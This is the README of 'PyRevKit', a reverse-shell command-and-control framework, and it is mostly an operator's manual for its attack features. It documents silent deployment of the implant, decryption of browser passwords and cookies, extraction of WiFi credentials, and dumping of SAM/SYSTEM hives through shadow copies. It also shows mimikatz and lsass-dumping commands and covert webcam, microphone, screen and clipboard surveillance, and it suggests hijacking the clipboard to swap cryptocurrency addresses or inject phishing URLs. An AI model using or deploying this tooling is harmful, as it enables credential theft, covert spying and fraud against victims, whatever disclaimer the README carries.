<img src="PyRevKit_logo.png" alt="Alt Text" style="width:65%; height:auto;">

##

[![Python 3.7+](https://img.shields.io/badge/python-3.7+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Platform](https://img.shields.io/badge/platform-linux%20%7C%20windows%20%7C%20macos-lightgrey)](https://github.com/yourusername/pyrevkit)

[![WebSocket](https://img.shields.io/badge/protocol-WebSocket-blueviolet.svg)](https://websockets.readthedocs.io/)
[![TLS/SSL](https://img.shields.io/badge/encryption-TLS%2FSSL-red.svg)](https://en.wikipedia.org/wiki/Transport_Layer_Security)
[![Authentication](https://img.shields.io/badge/auth-PBKDF2--SHA256-orange.svg)](https://en.wikipedia.org/wiki/PBKDF2)

[![Features](https://img.shields.io/badge/commands-40+-success.svg)](https://github.com/yourusername/pyrevkit#-features)
[![Async](https://img.shields.io/badge/async-asyncio-blue.svg)](https://docs.python.org/3/library/asyncio.html)
[![Cross-Platform](https://img.shields.io/badge/cross--platform-yes-success.svg)](https://github.com/yourusername/pyrevkit)


A python coded feature-rich reverse shell C2 framework with encrypted WebSocket communication, comprehensive reconnaissance capabilities, advanced credential harvesting, browser data extraction with decryption, bi-directional file transfer, desktop surveillance with screenshots and webcam/audio capture.

**⚠️ Educational Purpose Only** - This tool is designed as a proof of concept (PoC) for educational purposes. Use responsibly and *only* on systems you own or have *explicit* permission to test.

---

## Features

### Core Features
- **Secure Communication**: TLS/SSL encrypted WebSocket connections
- **Authentication**: PBKDF2-SHA256 hashed credentials with salting
- **File Transfer**: Bidirectional file upload/download with base64 encoding
- **Auto-Reconnection**: Exponential backoff retry mechanism
- **Persistent Targets**: Targets remain connected between operator sessions
- **Multi-Session**: Multiple operators can connect to the same target sequentially
- **Numbered Target Selection**: Visual list of connected targets with quick number-based selection
- **Safe Execution**: Command timeout protection (30s default)

### Reconnaissance
- **File Search**: Search files by name pattern with customizable limits
- **Content Search**: Search inside text files for sensitive data
- **System Information**: System profiling with 10+ categories: uptime, admin status, all users, groups, listening ports, security software (AV/Firewall/UAC), processes, installed software, domain info, VM detection, scheduled tasks
- **Clipboard Access**: Read and write clipboard content on target machines
- **Credential Harvesting**: Extract WiFi passwords, enumerate browser credentials, harvest application credentials (FileZilla, PuTTY, WinSCP), Windows SAM/LSASS guidance

### Advanced Credential Harvesting
- **Browser Password Decryption**: Edge/Chrome v10/v11 with v20 detection
- **Registry Dump via VSS**: SAM/SYSTEM/SECURITY hives for offline hash extraction
- **WiFi Credentials**: Saved wireless network passwords
- **Windows Mail Export via VSS**: Complete email database extraction
- **Application Credentials**: FileZilla, PuTTY, WinSCP enumeration

### Browser Data Extraction with VSS
- **History, Cookies, Bookmarks, Downloads**: Extract from Chrome, Edge, Firefox
- **Automatic Cookie Decryption**: v10/v11/DPAPI decryption (seamless integration)
- **VSS Integration**: Bypasses locked databases when browser is running
- **Smart Fallback**: Direct copy → VSS fallback → automatic cleanup

### Smart File Operations
- **Pattern-Based Exfiltration**: Documents, credentials, source code, custom patterns
- **VSS File Access**: Access locked files via shadow copies
- **Directory Listing**: Recursive file system exploration
- **File Search**: Name and content-based searching

### Desktop Surveillance
- **Screenshot Capture**: Full-resolution desktop screenshots
- **Live Desktop Streaming**: Real-time monitoring at ~5 FPS with concurrent command execution
- **Webcam Capture**: Target webcam photo capture
- **Audio Recording**: Microphone recording (1-300 seconds)
- **Automatic Storage**: All media saved in `loot/` directory

##

## Table of Contents

- [Installation](#installation)
- [Quick Start](#quick-start)
- [Architecture](#architecture)
- [Usage (Commands)](#usage)
  - [File Transfer](#file-transfer-commands)
  - [Media Capture](#media-capture-commands)
  - [Reconnaissance](#reconnaissance-commands)
  - [Clipboard Monitoring](#clipboard-commands)
  - [Credential Harvesting](#credential-harvesting-commands)
  - [Smart File Exfiltration](#smart-file-exfiltration)
  - [Email/Messaging Extraction](#email-and-messaging-extraction)
  - [Shell Upgrading](#shell-upgrading)
- [Configuration](#configuration)
- [Troubleshooting](#troubleshooting)
- [System Information Issues](#system-information-issues)
- [Platform Specific Notes](#platform-specific-notes)
- [Legal Disclaimer](#legal-disclaimer)
- [License](#license)

##

## Installation

### Requirements

PyRevKit has **three components** with different dependencies:

#### **C2 Server**
**Required on the machine running `pyrev_server.py`:**

- Python 3.7+
- `websockets` library
- SSL certificate (`server.pem`)

```bash
# Put pyrev_server.py on the C2 and install websockets
wget 'https://raw.githubusercontent.com/infosecm/PyRevKit/refs/heads/main/pyrev_server.py'
pip install websockets

# Generate SSL certificate
openssl req -x509 -newkey rsa:4096 -nodes -out server.pem -keyout server.pem -days 365
```

**No optional dependencies needed** - server just relays commands.

---

#### **Client (Operator Console)**
**Required on the operator's machine running `pyrev_client.py`:**

- Python 3.7+
- `websockets` library

```bash
# You may clone the repository, although only pyrev_client.py is needed. You must also install websockets.
git clone https://github.com/yourusername/pyrevkit.git
pip install websockets
```

**No optional dependencies needed** - client just sends commands.

---

#### **Target (Compromised Machine)**
**Required on ALL target machines running `pyrev_target.py`:**

**Core (Required):**
- Python 3.7+
- `websockets` library

```bash
# Copy only pyrev_target.py to compromised machine and install websockets.
wget 'https://raw.githubusercontent.com/infosecm/PyRevKit/refs/heads/main/pyrev_target.py'
pip install websockets
```

###

**Optional (only if using these features):**

| Feature | Dependencies | When Needed |
|---------|--------------|-------------|
| **Cookies & password decryption** | `pycryptodome`, `pywin32` | If using `creds edge_decrypt`, `creds chrome_decrypt`, `browser cookies`, `browser cookies --save` commands; Windows only; v10/v11 support only |
| **Screenshots & desktop streaming** | `mss`, `pillow` | If using `screenshot` or `stream_start` command. `mss` required on Linux, optional on Windows/macOS (fallback to `PIL.ImageGrab`) |
| **Webcam Capture** | `opencv-python` | If using `webcam` command |
| **Audio Recording** | `sounddevice`, `scipy`, `numpy` | If using `record` command |
| **Clipboard Access** | `pyperclip` | If using `clipboard`, `clipboard monitor`, `clipboard set` commands |
| | + Linux: `xclip` or `wl-clipboard` | On Linux targets |

###

```bash
# Browser cookie/password decryption (v10/v11)
pip install pycryptodome pywin32

# Screenshots & desktop streaming
pip install mss pillow

# For media capture (webcam + audio)
pip install opencv-python sounddevice scipy numpy

# For clipboard features
pip install pyperclip

# Linux clipboard support
sudo apt-get install xclip  # For X11
# or
sudo apt-get install wl-clipboard  # For Wayland
```
###

**Key Points:**
- ✅ VSS features require **Administrator privileges** on target
- ✅ v20 cookie decryption is **not supported** (documented below)
- ✅ Most features work with just `websockets` installed

---

## Quick Start

### 1. Setup Credentials

```bash
# Add operator credentials on C2 server
python pyrev_server.py -creds operator admin SecurePassword123!

# Add target credentials on C2 server
python pyrev_server.py -creds target machineA TargetPassword456!
```

#### Credential Management

Credentials are stored in `credentials.json` with PBKDF2-SHA256 hashing:

```json
{
  "operator": {
    "admin": {
      "hash": "0b2ad92a1f3e68487a780b3c6d7ab33c...",
      "salt": "e48cbd452e38b9337130dcb82f3b761c..."
    }
  },
  "target": {
    "machineA": {
      "hash": "f61a20f536c15913156a282b3eb84b03...",
      "salt": "ff789cd49679ebadd2f60b02094ae21b..."
    }
  }
}
```
##

### 2. Start the Server

```bash
python pyrev_server.py [OPTIONS]
```

**Options:**
- `-creds ROLE LOGIN PASSWORD` - Add/update credentials
- `-host HOST` - Server host (default: 0.0.0.0)
- `-port PORT` - Server port (default: 8765)
- `-cert FILE` - SSL certificate file (default: server.pem)

```bash
# Usage example
python pyrev_server.py -host 192.0.2.1 -port 8765 -cert server.pem
```

Output example:
```
[+] Directories ready: loot/, payloads/
[+] Server running on wss://192.0.2.1:8765
[+] Credentials file: credentials.json
[+] Loot directory: loot/
[+] Payloads directory: payloads/
```

##

### 3. Connect a Target

```bash
python pyrev_target.py
```

#### Autonomous Mode (Silent Deployment)

Edit the configuration section in `pyrev_target.py`:

```python
# ========== CONFIGURATION ==========
TARGET_ID = "machineA"
SERVER_HOST = "192.0.2.1"
SERVER_PORT = 8765

AUTO_LOGIN = "machineA"           # Fill for auto-connect
AUTO_PASSWORD = "TargetPass456"   # Fill for auto-connect
# ====================================
```

Then simply run:

```bash
python pyrev_target.py
```

Output:
```
[+] Auto-connecting to 192.0.2.1:8765 as machineA
[+] Connected and authenticated. Waiting for commands...
```

#### Interactive Mode

Not providing values for AUTO_LOGIN and AUTO_PASSWORD will make pyrev_target.py run in interactive mode:

```
Server host [192.0.2.1]:
Server port [8765]:

--- Authentication ---
Login: machineA
Password: [hidden]
[SERVER] Authentication successful. Waiting for commands...
[+] Target agent ready. Waiting for commands...
```

##

### 4. Connect as Operator

```bash
python pyrev_client.py
```

New interactive target selection:
```
Server host [192.0.2.1]:
Server port [8765]:

--- Authentication ---
Login: admin
Password: [hidden]
[+] Connected to server

[+] Authentication successful

============================================================
  CONNECTED TARGETS
============================================================
  [1] machineA
  [2] machineB
  [3] prod-web-01
============================================================

Select target [number or name]: 1
[*] Connecting to target: machineA
[SERVER] Connected to target 'machineA'

============================================================
✓ Interactive session started
  Type 'help' for available commands
  Type 'exit' to quit
============================================================

>>> whoami
victim-pc
>>> 
```

##

## Architecture

```
┌─────────────────┐         ┌────────────────┐         ┌────────────────┐
│     Operator    │         │   C2 Server    │         │     Target     │
│                 │◄───────►│   - Auth       │◄───────►│                |
│                 │   WSS   │   - Relay      │   WSS   │                │
│  pyrev_client   │         │   - Files      │         │  pyrev_target  │
└─────────────────┘         │                │         └────────────────┘
                            |  pyrev_server  |                  |
                            └────────────────┘              downloads/
                                     │
                              ┌──────┴──────┐
                              │             │
                            loot/       payloads/
```

##

## Usage

### File Transfer Commands

#### Download Files from Target to C2 Server

```bash
>>> download /etc/passwd
[*] Requesting download: /etc/passwd
[✓] Downloaded passwd (2.45 KB) → loot/machineA_passwd
```

Files are downloaded from the target to the C2 server's `loot/` folder.

**Features:**
- Automatic renaming with target prefix
- Size display
- Max file size: 50MB
- Supports absolute and relative paths

##

#### Upload Files from C2 Server to Target

```bash
>>> upload exploit.sh
[*] Uploading: exploit.sh
[✓] Saved exploit.sh (5.67 KB) → downloads/exploit.sh
```

Files are uploaded from the server's `payloads/` directory to the target's `downloads/` folder.

##

#### List Files

```bash
# List downloaded files in the C2 server's loot/ folder
>>> ls_loot
Files in loot/:
  - machineA_passwd (2.45 KB)
  - machineA_audio_20260407_003625.wav (5168.01 KB)

# List available files in the C2 server's payloads/ folder
>>> ls_payloads
Files in payloads/:
  - exploit.sh (5.67 KB)
  - payload.exe (234.56 KB)

# List available files in the target's downloads/ folder
>>> ls_downloads
[*] Listing downloads directory...
Files in downloads/ directory:
  - screenshot_20260407_003520.png (452.85 KB)

💡 Download with: download screenshot_20260407_003520.png
```

##

### Media Capture Commands

#### Webcam Capture

Capture photos from the target's webcam:

```bash
>>> webcam
[*] Capturing webcam...
[✓] Webcam captured (156.78 KB) → loot/machineA_webcam_20260403_143022.jpg
```

**Features:**
- JPEG format
- Native webcam resolution
- Automatic timestamped naming
- Saved to `loot/` directory

**Requirements:**
- Target must have `opencv-python` installed: `pip install opencv-python`
- Webcam must be accessible (not used by another application)

##

#### Audio Recording

Record audio from the target's microphone:

```bash
>>> record 30
[*] Recording 30 seconds of audio...
[✓] Audio recorded (5.05 MB) → loot/machineA_audio_20260403_143522.wav
```

**Parameters:**
- Duration: 1 to 300 seconds (5 minutes max)
- Format: WAV, 44.1kHz, 16-bit, stereo
- Approximate size: ~170 KB per second

**Examples:**
```bash
>>> record 10      # 10 seconds (~1.7 MB)
>>> record 60      # 1 minute (~10 MB)
>>> record 300     # 5 minutes (max, ~50 MB)
```

**Requirements:**
- Target must have audio libraries installed:
  ```bash
  pip install sounddevice scipy numpy
  ```

##

#### Screenshot

Takes screenshot from the target's display

```bash
>>> screenshot
[*] Capturing screenshot...
[✓] Screenshot captured (452.85 KB) → loot\machineA_screenshot_20260407_003520.png
```

**Requirements:**
- Target must have mss library installed:

```bash
pip install mss
```

##

#### Desktop Streaming

Streams a continuous flow of screenshots at ~5 FPS with concurrent commands supported.

```bash
>>> stream_start
[*] Starting desktop stream...
[*] Desktop stream started from machineA
[*] Stream frames will be saved in loot/ directory
[*] You can continue using commands while streaming
[*] Use 'stream_stop' to end the stream

>>> stream_stop
[*] Stopping desktop stream...
[*] Desktop stream stopped
```

**Requirements:**
- Target must have mss library installed:

```bash
pip install mss
```

##

### Reconnaissance Commands

#### File Search

Search for files by name pattern:

```bash
>>> search *.pdf
[*] Searching for files: *.pdf
[✓] Found 15 results:
  1. C:\Users\John\Documents\report.pdf (523.45 KB)
  2. C:\Users\John\Desktop\invoice.pdf (102.34 KB)
  ...
```

**With custom limit:**
```bash
>>> search *.pem --limit 20
[*] Searching for files: *.pem (limit: 20)
[✓] Found 20 results:
  1. /home/user/cert1.pem (5.61 KB)
  ...
  20. /home/user/cert20.pem (3.24 KB)
```

**Supported patterns:**
- `*.pdf` - All PDF files
- `*.docx` - All Word documents
- `password*` - Files starting with "password"
- `*config*` - Files containing "config"
- `secret.txt` - Specific file

**Default limit:** 100 results (use `--limit N` to customize)

##

#### Content Search

Search inside text files for sensitive data:

```bash
>>> search --content "password"
[*] Searching for content: password
[✓] Found 8 results:
  1. C:\config.txt:45
     database_password=admin123
  2. C:\Users\John\notes.txt:12
     Remember to change password next week
  ...
```

**With custom limit:**
```bash
>>> search --content "api_key" --limit 15
[*] Searching for content: api_key (limit: 15)
[✓] Found 45 results:
  1. /app1/config.json:23
     "api_key": "sk_live_abc123..."
  ...
  15. /app12/config.json:43
     "api_key": "s8jdggkdvt..."
```

**Supported file types:**
- Text files: `.txt`, `.log`, `.conf`, `.config`, `.ini`
- Code files: `.py`, `.sh`, `.bat`, `.cmd`
- Data files: `.xml`, `.json`

**Limitations:**
- Max file size: 10MB per file
- Text files only (binary files skipped)

##

#### System Information

Gather comprehensive system information for reconnaissance and profiling:

```bash
>>> sysinfo
[*] Gathering system information...
[✓] System Information - prod-web-01

═══ SYSTEM ═══
Os: Windows
Os Version: 10.0.19045
Os Release: 10
Hostname: PROD-WEB-01
Architecture: AMD64
Processor: Intel Core i7-9700K @ 3.60GHz
Python Version: 3.11.0
Platform: Windows-10-10.0.19045-SP0
Uptime: 15d 3h 42m
Uptime Seconds: 1317720

═══ CURRENT USER ═══
Username: jdoe
Home: C:\Users\jdoe
Administrator/Root: YES
Groups: Administrators, Remote Desktop Users

═══ ALL USERS ═══
Total: 8
  1. Administrator
  2. jdoe
  3. sql_service
  4. backup_admin
  5. Guest
  ...

═══ NETWORK ═══
Hostname: PROD-WEB-01
Local Ip: 192.168.1.100
Listening Ports (12 total):
  - 0.0.0.0:135
  - 0.0.0.0:445
  - 0.0.0.0:3389
  - 0.0.0.0:5357
  ...
Listening Count: 12

═══ SECURITY ═══
Antivirus: Windows Defender (Enabled)
Firewall: Enabled
Uac: Enabled

═══ PROCESSES ═══
Total Running: 156
Security-Related Processes:
  - MsMpEng.exe (Windows Defender)
  - SecurityHealthService.exe

═══ INSTALLED SOFTWARE ═══
Detected Applications:
  - Google Chrome
  - Microsoft Office
  - Python
  - Java

═══ STORAGE ═══
C:: 120.5GB free / 512.0GB total
D:: 450.2GB free / 1024.0GB total

═══ DOMAIN INFO ═══
Name: CORP.LOCAL
Is Joined: True

═══ VIRTUALIZATION ═══
VM Detected: YES (vmware)

═══ SCHEDULED TASKS ═══
User Tasks: 3
  - \BackupScript
  - \DatabaseMaintenance
```

##

**Comprehensive information collected:**

**System Details:**
- Operating system and version
- Hardware specifications (CPU, architecture)
- **System uptime** (days, hours, minutes)
- Platform information
- Python version

**User Information:**
- Current username and home directory
- **Administrator/Root privileges** (critical for privilege escalation assessment)
- **Group memberships** (Administrators, sudo, wheel, etc.)
- **Complete list of all local users** (identify service accounts, admin accounts)

**Network Configuration:**
- Hostname and local IP address
- **Listening ports** (exposed services: RDP, SMB, SSH, etc.)
- Active network interfaces
- Port count for attack surface assessment

**Security Posture:**
- **Antivirus status** (Windows Defender, etc.)
- **Firewall status** (enabled/disabled on all profiles)
- **UAC level** (Windows User Account Control)
- **SELinux status** (Linux - Enforcing/Permissive/Disabled)

**Processes & Services:**
- Total running processes
- **Security-related processes** (AV, EDR, security tools)
- Detection of: Defender, CrowdStrike, SentinelOne, McAfee, etc.

**Installed Software:**
- Common applications detected (Chrome, Office, Python, Java, etc.)
- Package manager information (Linux)
- Package count

**Storage:**
- All drives/mounts with free and total space
- Disk usage analysis

**Domain Information (Windows):**
- Domain name
- **Domain-joined status** (vs Workgroup)
- Useful for Active Directory enumeration

**Scheduled Tasks:**
- **User-created scheduled tasks** (Windows)
- **Crontab entries** (Linux/macOS)
- Persistence opportunity identification

**Virtualization:**
- **VM detection** (VMware, VirtualBox, Hyper-V, KVM, Xen)
- Physical vs virtual machine identification

**Environment Variables:**
- Important system paths
- Development environment indicators

**Platform Support:**
- ✅ Windows: Full feature set (all categories)
- ✅ Linux: Full feature set (except Domain, UAC - as expected)
- ✅ macOS: Full feature set (except Domain, UAC - as expected)

**No additional dependencies required** - uses Python standard library only.

**Perfect for:**
- Initial reconnaissance
- Privilege escalation planning
- Attack surface mapping
- Security posture assessment
- Finding service accounts and admin users
- Identifying persistence opportunities

##

### Clipboard Commands

#### Read Clipboard

Capture clipboard content from the target:

```bash
>>> clipboard
[*] Reading clipboard...
[✓] Clipboard content:
MySecretPassword123!
```

**Use cases:**
- Capture copied passwords
- Intercept copied credentials
- Monitor user activity
- Capture API keys and tokens

##

#### Write to Clipboard

Inject content into the target's clipboard:

```bash
>>> clipboard set "Hello from operator"
[*] Setting clipboard...
[✓] Clipboard updated
```

**Use cases:**
- Replace cryptocurrency addresses
- Inject phishing URLs
- Modify copied commands
- Social engineering attacks

##

#### Clipboard Monitor

Continuously monitor clipboard changes in real-time with timestamps. Target stores captures in memory, client polls on demand.

**Start Monitoring:**
```bash
>>> clipboard monitor 300
[*] Monitoring clipboard for 300 seconds...
[*] Target monitors in background
[*] Use 'clipboard check' to see new captures
[+] Monitoring clipboard... (duration: 300s)
>>>
```

###

**Check for New Captures:**
```bash
>>> clipboard check
[2026-04-04 23:56:05] Copied: password123
[2026-04-04 23:56:18] Copied: admin@company.com
[2026-04-04 23:56:35] Copied: secret_key_xyz
>>>

# Check again later
>>> clipboard check
[2026-04-04 23:57:12] Copied: api_token_abc
>>>

# No new captures
>>> clipboard check
[*] No new clipboard captures
>>>
```
*Note: Shows only NEW captures since last check. Maintains index automatically.*

- **Flexible** - Check captures as often or rarely as you want
- **Auto-stop** - Automatically stops after specified duration

**Requirements:**
- Target must have `pyperclip` installed: `pip install pyperclip`
- Graphical environment required (not headless servers)
- **Linux:** Requires `xclip` or `xsel`:

```bash
sudo apt-get install xclip
```

##

### Credential Harvesting Commands

Extract and enumerate credentials from various sources on the target machine.

#### WiFi Passwords

```bash
>>> creds wifi
[*] Harvesting wifi credentials...
[✓] Credential Harvesting - WIFI

WiFi Networks (5 found):
  SSID: HomeNetwork
  Password: MySecurePassword123

  SSID: Office_WiFi
  Password: Company2024!

  SSID: Guest_Network
  Password: [No password or encrypted]
```

**What it extracts:**
- **Windows**: Uses `netsh wlan` to extract saved WiFi passwords (up to 20 profiles)
- **Linux**: Reads NetworkManager configuration files from `/etc/NetworkManager/system-connections/`

##

#### Browser Credentials

```bash
>>> creds browsers
[*] Harvesting browsers credentials...
[✓] Credential Harvesting - BROWSERS

CHROME:
  Found: Yes
  Count: 45
  Location: C:\Users\jdoe\AppData\Local\Google\Chrome\User Data\Default\Login Data

FIREFOX:
  Found: Yes
  Count: 23
  Location: C:\Users\jdoe\AppData\Roaming\Mozilla\Firefox\Profiles\abc.default

EDGE:
  Found: Yes
  Count: 12
  Location: C:\Users\jdoe\AppData\Local\Microsoft\Edge\User Data\Default\Login Data

Note: Actual password decryption requires additional tools
```

**What it enumerates:**
- **Google Chrome** - Counts stored credentials and shows database location
- **Mozilla Firefox** - Enumerates logins from profiles
- **Microsoft Edge** - Windows only, shows credential count

**Note**: This command **counts** credentials but does NOT decrypt passwords. Download the database files and use offline 3rd party tools like `LaZagne`, `SharpChrome`, or `firefox_decrypt.py` for actual password extraction, or you can try extracting passwords with the following commands:

```bash
>>> creds edge_decrypt
[*] Harvesting edge_decrypt credentials...
[✓] Credential Harvesting - EDGE_DECRYPT

Browser: Edge
Total Credentials: 9
  Decrypted (v10/v11): 2
  App-Bound (v20): 7

⚠️  Edge uses App-Bound Encryption (v20) for newer passwords

═══ DECRYPTED PASSWORDS (v10/v11) ═══

  URL: https://github.com
  Username: john.doe@company.com
  Password: GitHubPass2024!
  Version: v10

  URL: https://outlook.office365.com
  Username: jdoe@corp.local
  Password: C0rpMail#2023
  Version: v11

═══ APP-BOUND ENCRYPTED (v20) ═══

  7 password(s) could not be decrypted (App-Bound Encryption)
  [v20 App-Bound - Export Required]

💡 To export v20 passwords:
   1. Open Edge
   2. Go to: edge://settings/passwords
   3. Click ⋯ (three dots) next to "Saved passwords"
   4. Click "Export passwords"
   5. Save as CSV file
```

##

```bash
>>> creds chrome_decrypt
[*] Harvesting chrome_decrypt credentials...
[✓] Credential Harvesting - CHROME_DECRYPT

Browser: Chrome
Total Credentials: 3
  Decrypted (v10/v11): 3
  App-Bound (v20): 0

═══ DECRYPTED PASSWORDS (v10/v11) ═══

  URL: https://github.com
  Username: jdoe
  Password: gh_p4ssw0rd!42
  Version: v10

  URL: https://mail.google.com
  Username: john.doe@gmail.com
  Password: Gm4ilP@ss2024
  Version: v10

  URL: https://gitlab.corp.local
  Username: jdoe
  Password: G!tl4bR00t#99
  Version: v11
```

###

✅ If running v10/v11, Edge passwords will be decrypted.
❌ We do not provide support for V20 Edge passwords decryption.

##

#### Registry Dump via VSS (requires Admin)

```bash
# Dump SAM/SYSTEM/SECURITY hives via VSS

>>> creds registry_dump_vss
[*] Harvesting registry_dump_vss credentials...
[✓] Credential Harvesting - REGISTRY_DUMP_VSS

╔════════════════════════════════════════════════════╗
║  REGISTRY HIVES DUMPED VIA VSS                     ║
╚════════════════════════════════════════════════════╝

Method: Volume Shadow Copy (VSS)
Hives Dumped: SAM, SYSTEM, SECURITY
Total Hives: 3/3

Filename: registry_dump_20260412_232852.zip
Location: downloads\registry_dump_20260412_232852.zip
Original Size: 21.94 MB
ZIP Size: 4.18 MB
Compression: 80.9%

💡 Download with:
   >>> download registry_dump_20260412_232852.zip

🔓 Extract credentials with:
   secretsdump.py -sam SAM -system SYSTEM -security SECURITY LOCAL

Or use Impacket:
   python3 secretsdump.py -sam SAM -system SYSTEM LOCAL
```

###

**VSS Registry Dump Workflow:**
1. Creates VSS snapshot of system drive
2. Copies registry hives from shadow:
   - `C:\Windows\System32\config\SAM`
   - `C:\Windows\System32\config\SYSTEM`
   - `C:\Windows\System32\config\SECURITY`
3. Creates ZIP archive
4. Automatic cleanup

###

**Other harvesting methods:**
```bash
# 2. If admin, upload dumping tool
>>> upload mimikatz.exe

# 3. Execute manually
>>> mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"

# Or use ProcDump
>>> upload procdump64.exe
>>> procdump64.exe -accepteula -ma lsass.exe lsass.dmp
>>> download lsass.dmp
```

##

#### Application Credentials

```bash
>>> creds applications
[*] Harvesting applications credentials...
[✓] Credential Harvesting - APPLICATIONS

FILEZILLA:
  Found: Yes
  - file: recentservers.xml
    note: Contains FTP credentials (plaintext in XML)
  - file: sitemanager.xml
    note: Contains FTP credentials (plaintext in XML)

PUTTY:
  Found: Yes
  Sessions: prod-server, dev-db, backup-host
  Note: Session names found in registry (passwords not stored by PuTTY)

WINSCP:
  Found: Yes
  Location: C:\Users\jdoe\AppData\Roaming\WinSCP.ini
  Note: Contains encrypted passwords (can be decrypted with tools)
```

###

**What it finds:**
- **FileZilla** - FTP credentials stored in **plaintext XML** (passwords are base64 encoded)
- **PuTTY** - SSH session names from Windows Registry (no passwords stored)
- **WinSCP** - Encrypted passwords in config file (can be decrypted with tools)


##

#### Browser Data Extraction

```bash
# Show first 50 history entries

>>> browser history
[*] Extracting browser history...
[✓] Browser HISTORY - First 50 Entries

═══ CHROME (21 entries) ═══

  [1] https://github.com/corp/internal-api
      Title: corp/internal-api: Internal REST API · GitHub
      Visits: 14 | Last: 2026-04-13 09:14:22

  [2] https://mail.google.com/mail/u/0/
      Title: Inbox - john.doe@gmail.com
      Visits: 87 | Last: 2026-04-13 08:55:01

[...]

═══ EDGE (18 entries) ═══

  [1] https://outlook.office365.com/mail/inbox
      Title: Mail - John Doe - Outlook
      Visits: 61 | Last: 2026-04-13 09:02:14

  [2] https://corp.sharepoint.com/sites/IT/Documents/Forms/AllItems.aspx
      Title: Documents - IT - SharePoint
      Visits: 9 | Last: 2026-04-13 08:44:58

[...]

═══ FIREFOX (11 entries) ═══

  [1] https://stackoverflow.com/questions/74821966
      Title: python - asyncio websocket connection drops after idle - Stack Overflow
      Visits: 3 | Last: 2026-04-13 07:30:19

  [2] https://docs.python.org/3/library/asyncio-task.html
      Title: Coroutines and Tasks — Python 3.12 documentation
      Visits: 8 | Last: 2026-04-12 21:14:55

[...]
────────────────────────────────────────────────────
Total shown: 50 entries across 3 browsers
💡 Export all entries with: browser history --save
```

##

```bash
# Save all history to file → downloads/browser_history_TIMESTAMP.txt

>>> browser history --save
[*] Extracting browser history and saving to file...
[✓] Browser HISTORY - Complete Data Saved to File

╔═══════════════════════════════════════════════════════╗
║  FILE SAVED SUCCESSFULLY                              ║
╚═══════════════════════════════════════════════════════╝

Filename: browser_history_20260413_000731.txt
Location: downloads\browser_history_20260413_000731.txt
Size: 1639.17 KB
Total Entries: 4638

💡 Download this file with:
   >>> download downloads\browser_history_20260413_000731.txt
```
✅ No LIMIT - saves everything

##

```bash
# Show first 50 cookies with decryption attempt

>>> browser cookies
[*] Extracting browser cookies...
[✓] Browser COOKIES - First 50 Entries (decryption enabled)

═══ CHROME (23 entries) ═══

  [1] Host: .github.com
      Name: user_session
      Value: abc12XqT9mNp3vKwRsLu7fY...
      Decrypted: Yes (v10)
      Expires: 1776643200

  [2] Host: .google.com
      Name: SID
      Value: g.a000pQrKtY8mZxL3bNc...
      Decrypted: Yes (v10)
      Expires: 1807747200

[...]

═══ EDGE (19 entries) ═══

  [1] Host: .office365.com
      Name: ESTSAUTH
      Value: [v20 App-Bound]
      Expires: 1776643200

  [2] Host: .sharepoint.com
      Name: FedAuth
      Value: 77u/PD94bWwgdmVyc2...
      Decrypted: Yes (v10)
      Expires: 1776729600

[...]

═══ FIREFOX (8 entries) ═══

  [1] Host: .stackoverflow.com
      Name: prov
      Value: 4a3b2c1d-e5f6-7890-ab...
      Expires: 1902355200

  [2] Host: 10.0.0.5
      Name: session_id
      Value: 8f3d1a9c2e74b056...
      Expires: 0

[...]
────────────────────────────────────────────────────
Total shown: 50 entries across 3 browsers
✅ v10/v11 cookies automatically decrypted
❌ v20 App-Bound cookies cannot be decrypted
💡 Export all cookies with: browser cookies --save
```

##

```bash
# Save all cookies with decryption → downloads/browser_cookies_TIMESTAMP.txt

>>> browser cookies --save
[*] Extracting browser cookies and saving to file...
[✓] Browser COOKIES - Complete Data Saved to File

╔═══════════════════════════════════════════════════════╗
║  FILE SAVED SUCCESSFULLY                              ║
╚═══════════════════════════════════════════════════════╝

Filename: browser_cookies_20260413_000958.txt
Location: downloads\browser_cookies_20260413_000958.txt
Size: 264.73 KB
Total Entries: 2858

💡 Download this file with:
   >>> download downloads\browser_cookies_20260413_000958.txt
```

✅ No LIMIT - saves everything
✅ Automatic decryption integrated
✅ Uses VSS if database locked
❌ v20 unsupported; shows as [v20 App-Bound]

##

**Encryption Version Support**
| Version | Encryption Method | Decryption Support | Status |
|---------|------------------|-------------------|--------|
| **v10** | AES-256-GCM | ✅ **Full Support** | Uses master key from Local State |
| **v11** | AES-256-GCM | ✅ **Full Support** | Same as v10 |
| **v20** | App-Bound Encryption | ❌ **Cannot Decrypt** | Service-managed, hardware-backed |
| **DPAPI** | Windows DPAPI | ✅ **Full Support** | Legacy encryption |
| **Plaintext** | None | ✅ **Direct Read** | Some cookies stored unencrypted |

###

**✅ Benefits:**
- Bypasses file locks (works with apps running)
- Looks like legitimate backup operation
- No direct process interaction needed

###

**⚠️ Detection Risks:**
- VSS operations logged in Windows Event Logs (Event ID 8222, 8224)
- EDR/AV may monitor VSS API calls
- SIEM may alert on unusual VSS patterns
- Requires Admin privileges (elevation may be logged)

##

```bash
# Show first 50 bookmarks

>>> browser bookmarks
[*] Extracting browser bookmarks...
[✓] Browser BOOKMARKS - First 50 Entries

═══ CHROME (24 entries) ═══

  [1] Name: Internal API Docs
      URL:  https://corp.github.io/internal-api/docs

  [2] Name: Jenkins CI
      URL:  https://jenkins.corp.local:8080

[...]

═══ EDGE (17 entries) ═══

  [1] Name: Microsoft 365 Admin
      URL:  https://admin.microsoft.com

  [2] Name: Azure AD - Users
      URL:  https://portal.azure.com/#blade/Microsoft_AAD_IAM/UsersManagementMenuBlade

[...]

═══ FIREFOX (9 entries) ═══

  [1] Name: Python asyncio docs
      URL:  https://docs.python.org/3/library/asyncio.html

  [2] Name: Docker Hub
      URL:  https://hub.docker.com

[...]

────────────────────────────────────────────────────
Total shown: 50 entries across 3 browsers
💡 Export all bookmarks with: browser bookmarks --save
```

##

```bash
# Save all bookmarks to file → downloads/browser_cookies_TIMESTAMP.txt

>>> browser bookmarks --save
[*] Extracting browser bookmarks and saving to file...
[✓] Browser BOOKMARKS - Complete Data Saved to File

╔═══════════════════════════════════════════════════════╗
║  FILE SAVED SUCCESSFULLY                              ║
╚═══════════════════════════════════════════════════════╝

Filename: browser_bookmarks_20260413_000421.txt
Location: downloads\browser_bookmarks_20260413_000421.txt
Size: 392.14 KB
Total Entries: 2440

💡 Download this file with:
   >>> download downloads\browser_bookmarks_20260413_000421.txt
```
